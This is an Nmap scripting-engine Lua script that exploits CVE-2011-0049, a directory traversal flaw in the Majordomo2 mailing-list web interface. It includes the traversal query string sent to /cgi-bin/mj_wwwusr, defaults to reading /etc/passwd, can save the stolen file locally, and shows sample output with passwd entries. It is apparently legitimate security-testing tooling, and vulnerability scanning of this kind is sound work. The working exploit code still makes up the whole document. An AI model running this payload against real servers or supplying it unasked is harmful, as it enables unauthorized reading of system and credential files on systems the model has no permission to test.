local http = require "http"
local io = require "io"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local exploit = require "exploit"

description = [[
Exploits a directory traversal vulnerability existing in Majordomo2 to retrieve remote files. (CVE-2011-0049).

Vulnerability originally discovered by Michael Brooks.

For more information about this vulnerability:
* http://www.mj2.org/
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0049
* http://www.exploit-db.com/exploits/16103/
]]

---
-- @usage
-- nmap -p80 --script http-majordomo2-dir-traversal <host/ip>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http    syn-ack
-- | http-majordomo2-dir-traversal: /etc/passwd was found:
-- |
-- | root:x:0:0:root:/root:/bin/bash
-- | bin:x:1:1:bin:/bin:/sbin/nologin
-- |
--
-- @args http-majordomo2-dir-traversal.rfile Remote file to download. Default: /etc/passwd
-- @args http-majordomo2-dir-traversal.uri URI Path to mj_wwwusr. Default: /cgi-bin/mj_wwwusr
-- @args http-majordomo2-dir-traversal.outfile If set it saves the remote file to this location.
--
-- Other arguments you might want to use with this script:
-- * http.useragent - Sets user agent
--

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln", "exploit"}


portrule = shortport.http

local MAJORDOMO2_EXPLOIT_QRY = "?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../.."
local MAJORDOMO2_EXPLOIT_URI = "/cgi-bin/mj_wwwusr"
local DEFAULT_RFILE = '/etc/passwd'

---
-- MAIN
---
action = function(host, port)
  local response, rfile, rpath, uri, evil_uri, rfile_content, filewrite, payload
  local output_lines = {}

  filewrite = stdnse.get_script_args("http-majordomo2-dir-traversal.outfile")
  uri = stdnse.get_script_args("http-majordomo2-dir-traversal.uri") or MAJORDOMO2_EXPLOIT_URI
  rfile = stdnse.get_script_args("http-majordomo2-dir-traversal.rfile") or DEFAULT_RFILE

  payload = uri .. MAJORDOMO2_EXPLOIT_QRY

  local status, lfi_success, contents = exploit.lfi_check(host, port, payload, rfile)

  if contents and contents:match("unknowntopic") then
    stdnse.debug1("[Error] The server is not vulnerable, '%s' was not found or the web server has insufficient permissions to read it", rfile)
    return
  end
  local _
  _, _, rfile_content = string.find(contents, '<pre>(.*)<!%-%- Majordomo help_foot format file %-%->')
  if rfile_content then
    output_lines[#output_lines+1] = rfile.." was found:\n"..rfile_content
    if filewrite then
      local status, err = exploit.write_file(filewrite,  rfile_content, rfile)
    end
    return stdnse.strjoin("\n", output_lines)
  else
    return
  end
end
